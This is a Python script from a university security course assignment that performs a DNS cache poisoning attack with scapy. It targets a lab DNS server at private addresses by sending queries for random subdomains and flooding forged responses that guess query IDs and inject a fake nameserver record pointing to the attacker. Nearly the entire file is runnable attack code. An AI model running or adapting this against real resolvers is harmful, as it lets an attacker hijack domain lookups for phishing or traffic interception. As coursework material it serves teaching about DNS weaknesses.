###############################################################################
#                                                                             #
# SECURITY 2014-2015                                                          #
# Name(s) : Cas van der Weegen [2566388]                                      #
# Study:    Computer Science                                                  #
# Course:   Security                                                          #
# Git: github.com/vdweegen                                                    #
#                                                                             #
# Assignment: DNS Challenge                                                   #
#                                                                             #
# Usage:   sudo python poison.py                                              #
#                                                                             #
# Note: Unless instructed otherwise, this file shall be uploaded at the end   #
#       of the college year 2014/2015                                         #
#                                                                             #
###############################################################################

#!/usr/bin/python
from scapy.all import *
# Work around a bug in the provided version of scapy!
import scapy.sendrecv,random,sys
scapy.sendrecv.wrpcap = wrpcap

target_domain = "b9ee5441d810a91b1f22a6925d2b2f6d01deea7ec8071e45." # Domain that we want to spoof
target_ns = "ns." + target_domain # Nameserver that we want to inject
my_ip = "10.17.9.2" # My own IP
target_ip = "10.17.9.3" # Vulnerable DNS Server
target_port = 53 # Dest port for Vulnerable DNS
auth_ip = "10.17.9.1" # Authoritive DNS Server
auth_port = 9999 # Source port for Vulnerable DNS
ttl = 3600 # TTL [6 min]
qid = 1 # Query ID Placeholder
did = 0 # Subdomain Dummy ID
fake_sub = "" # Fake Subdomain Placeholder

# Generate Random Subdomain to claim authority on
for i in range(5):
  fake_sub = fake_sub + chr(random.randint(97,122))

# Enter Forever loop (break when done)
while 1:
  fake_domain = fake_sub + str(did) + "." + target_domain # Construct a fake subdomain using base and Dummy ID
  did = did + 1 # Increment Dummy ID

  # Send Request to Vulnerable DNS for out Fake Domain
  request_packet =  IP(dst=target_ip)/ \
                    UDP(sport=random.randint(0,20000), dport=target_port)/ \
                    DNS(id=10, qr=0, rd=1, ra=0,
                      qd=DNSQR(qname=fake_domain),
                      an=0,
                      ns=0,
                      ar=0
      )
  # send the request
  send(request_packet,verbose=0)

  for i in range(30): # Send 30 packets per pass
    response_packet = IP(dst=target_ip, src=auth_ip)/ \
                        UDP(sport=target_port, dport=auth_port)/ \
                         DNS(id=qid, qr=1, rd=1, ra=1,
                          qd=DNSQR(qname=fake_domain),
                          an=DNSRR(rrname=fake_domain, ttl=ttl, rdata=my_ip),
                          ns=DNSRR(rrname=target_domain, ttl=ttl, rdata=target_ns, type=2), # Breakage without type=2
                          ar=DNSRR(rrname=target_ns, ttl=ttl, rdata=my_ip))

    # Increment the Query ID with 1
    qid = qid + 1
    # If we reached the MAX, reset counter
    if qid == 20000:
      qid = 1

    # Send the packet
    send(response_packet, verbose=0)
  
  # Request our fakedomain (again)
  ans = sr1(request_packet, timeout=3, retry=0, verbose=0)

  # Check if the poison worked
  try:
    if ans[DNS].an.rdata == my_ip:
      print "Great Success!!!!"
      break # It worked, exit
  except:
    sys.stdout.write('.') # Show something so the user knows we're still working
    sys.stdout.flush() # Make it actually show in the console
